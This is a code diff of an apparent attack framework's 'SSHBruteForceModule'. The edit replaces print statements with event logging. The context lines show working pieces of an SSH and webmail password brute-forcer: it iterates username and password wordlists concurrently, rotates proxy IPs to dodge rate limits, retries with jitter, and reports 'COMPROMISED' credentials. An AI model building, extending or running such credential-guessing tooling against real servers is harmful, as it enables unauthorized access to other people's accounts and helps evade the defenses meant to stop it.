@@ -190,7 +190,7 @@ class SSHBruteForceModule(BaseAttackModule):
         usernames = self.load_usernames()
         passwords = self.load_passwords()
 
-        print(
+        await self.emit_event('INFO', 
             f"\n[WORDLISTS] "
             f"{len(usernames)} usernames | "
             f"{len(passwords)} passwords"
@@ -219,15 +219,15 @@ class SSHBruteForceModule(BaseAttackModule):
             )
             return findings
 
-        print(f"\n[SSH OPEN] {host}:{port}")
+        await self.emit_event('INFO', f"\n[SSH OPEN] {host}:{port}")
 
         banner = await self._get_banner(host, port, timeout)
         if banner:
-            print(f"[BANNER] {banner}")
+            await self.emit_event('INFO', f"[BANNER] {banner}")
 
         if live:
 
-            print("\n[LIVE SSH ATTACK]")
+            await self.emit_event('INFO', "\n[LIVE SSH ATTACK]")
             semaphore = asyncio.Semaphore(concurrency)
 
             async def worker(username, password):
@@ -241,35 +241,35 @@ class SSHBruteForceModule(BaseAttackModule):
                     result = await self._try_auth(host, port, username, password, timeout)
 
                     if result == "success":
-                        print(f"\n[COMPROMISED] {username}:{password}\n")
+                        await self.emit_event('INFO', f"\n[COMPROMISED] {username}:{password}\n")
                         self.successes.append((username, password))
                         self.stop_scan = True
                         return
 
                     elif result == "auth_failed":
                         self.auth_fail_count += 1
-                        print(f"[FAIL] {username}:{password}")
+                        await self.emit_event('INFO', f"[FAIL] {username}:{password}")
 
                     elif result == "timeout":
                         self.timeout_count += 1
-                        print(f"[SLOW AUTH] {username}:{password}")
+                        await self.emit_event('INFO', f"[SLOW AUTH] {username}:{password}")
 
                     elif result == "reset":
                         self.reset_count += 1
-                        print(f"[RESET BY TARGET] {username}:{password}")
+                        await self.emit_event('INFO', f"[RESET BY TARGET] {username}:{password}")
                         await asyncio.sleep(2)
 
                     elif result == "rate_limited":
                         self.rate_limit_hits += 1
-                        print(f"[RATE LIMITED] {username}:{password}")
+                        await self.emit_event('INFO', f"[RATE LIMITED] {username}:{password}")
                         await asyncio.sleep(5)
 
                     elif result == "refused":
                         self.refused_count += 1
-                        print(f"[REFUSED] {username}:{password}")
+                        await self.emit_event('INFO', f"[REFUSED] {username}:{password}")
 
                     else:
-                        print(f"[OTHER] {username}:{password}")
+                        await self.emit_event('INFO', f"[OTHER] {username}:{password}")
 
                     await asyncio.sleep(adaptive_delay)
 
@@ -333,7 +333,7 @@ class SSHBruteForceModule(BaseAttackModule):
             )
         )
 
-        print(
+        await self.emit_event('INFO', 
             f"\n[COMPLETE] "
             f"{self.total_attempts} attempts | "
             f"{len(self.successes)} successes"
@@ -420,21 +420,21 @@ class SSHBruteForceModule(BaseAttackModule):
         if use_proxies:
             proxies = self.load_proxies()
             if proxies:
-                print(f"\n[PROXIES] Loaded {len(proxies)} proxy URLs")
+                await self.emit_event('INFO', f"\n[PROXIES] Loaded {len(proxies)} proxy URLs")
             else:
-                print("\n[WARN] use_proxies=True but no proxies loaded — using direct IP")
+                await self.emit_event('INFO', "\n[WARN] use_proxies=True but no proxies loaded — using direct IP")
 
         total_pairs = len(usernames) * len(passwords)
 
-        print(f"\n[WEBMAIL ATTACK] {login_url}")
-        print(
+        await self.emit_event('INFO', f"\n[WEBMAIL ATTACK] {login_url}")
+        await self.emit_event('INFO', 
             f"[WORDLISTS] {len(usernames)} usernames | "
             f"{len(passwords)} passwords | "
             f"{total_pairs} total pairs"
         )
 
         if proxies:
-            print(
+            await self.emit_event('INFO', 
                 f"[IP ROTATION] rotating through {len(proxies)} IPs "
                 f"every {rotate_proxy_every} attempts"
             )
@@ -469,12 +469,12 @@ class SSHBruteForceModule(BaseAttackModule):
                     ):
                         reachable = True
 
-                    print(
+                    await self.emit_event('INFO', 
                         f"[PROBE] {login_url} -> HTTP {probe_status} "
                         f"(final: {probe_final})"
                     )
         except Exception as e:
-            print(f"[WARN] Login page probe failed: {e}")
+            await self.emit_event('INFO', f"[WARN] Login page probe failed: {e}")
 
         if not reachable:
             if probe_status == 404:
@@ -505,7 +505,7 @@ class SSHBruteForceModule(BaseAttackModule):
             )
             return findings
 
-        print(
+        await self.emit_event('INFO', 
             f"[REACHABLE] {login_url} -> valid login page found — "
             f"starting brute force"
         )
@@ -642,7 +642,7 @@ class SSHBruteForceModule(BaseAttackModule):
                         attempts_on_this_proxy = 0
                     current_proxy = proxies[proxy_idx]
                     attempts_on_this_proxy += 1
-                    print(f"[PROXY] {username}:{password} using {current_proxy}")
+                    await self.emit_event('INFO', f"[PROXY] {username}:{password} using {current_proxy}")
 
                 for attempt in range(1 + max_retries):
 
@@ -660,30 +660,30 @@ class SSHBruteForceModule(BaseAttackModule):
                         self.timeout_count += 1
                         if attempt < max_retries:
                             wait_s = backoff_timeout + random.uniform(0, jitter)
-                            print(
+                            await self.emit_event('INFO', 
                                 f"[TIMEOUT] {username}:{password} "
                                 f"— retry {attempt + 1}/{max_retries} after {wait_s:.1f}s"
                             )
                             await asyncio.sleep(wait_s)
                             continue
                         else:
-                            print(f"[TIMEOUT-FINAL] {username}:{password}")
+                            await self.emit_event('INFO', f"[TIMEOUT-FINAL] {username}:{password}")
                             return
 
                     except aiohttp.ClientConnectionError as e:
                         self.refused_count += 1
-                        print(f"[CONN ERROR] {username}:{password} — {e}")
+                        await self.emit_event('INFO', f"[CONN ERROR] {username}:{password} — {e}")
                         return
 
                     except Exception as e:
-                        print(f"[ERROR] {username}:{password} — {e}")
+                        await self.emit_event('INFO', f"[ERROR] {username}:{password} — {e}")
                         return
 
                     # ---- Debug dump ----
                     if debug_mode and not debug_dumped:
                         debug_dumped = True
                         snippet = body_post[:1500].replace("\n", " ")
-                        print(
+                        await self.emit_event('INFO', 
                             f"\n[DEBUG] POST {canonical_url} -> HTTP {post_status}"
                             f" | Location: {location!r}"
                             f"\n[DEBUG] body[:1500]: {snippet}\n"
@@ -701,7 +701,7 @@ class SSHBruteForceModule(BaseAttackModule):
                     success_via_body = has_pass and not has_fail
 
                     if success_via_redirect or success_via_body:
-                        print(
+                        await self.emit_event('INFO', 
                             f"\n[WEBMAIL COMPROMISED] {username}:{password}"
                             f"  loc={location or 'body-match'}\n"
                         )
@@ -709,7 +709,7 @@ class SSHBruteForceModule(BaseAttackModule):
                         self.stop_scan = True
                     else:
                         self.auth_fail_count += 1
-                        print(
+                        await self.emit_event('INFO', 
                             f"[WEBMAIL FAIL] {username}:{password}"
                             f"  (HTTP {post_status} loc={location!r})"
                         )
@@ -791,7 +791,7 @@ class SSHBruteForceModule(BaseAttackModule):
             )
         )
 
-        print(
+        await self.emit_event('INFO', 
             f"\n[COMPLETE] "
             f"{self.total_attempts} attempts | "
             f"{len(self.successes)} successes"
@@ -892,5 +892,5 @@ class SSHBruteForceModule(BaseAttackModule):
             if "reset by peer"       in err: return "reset"
             if "connection lost"     in err: return "reset"
             if "too many connections" in err: return "rate_limited"
-            print(f"[ERROR] {e}")
+            await self.emit_event('INFO', f"[ERROR] {e}")
             return "other"
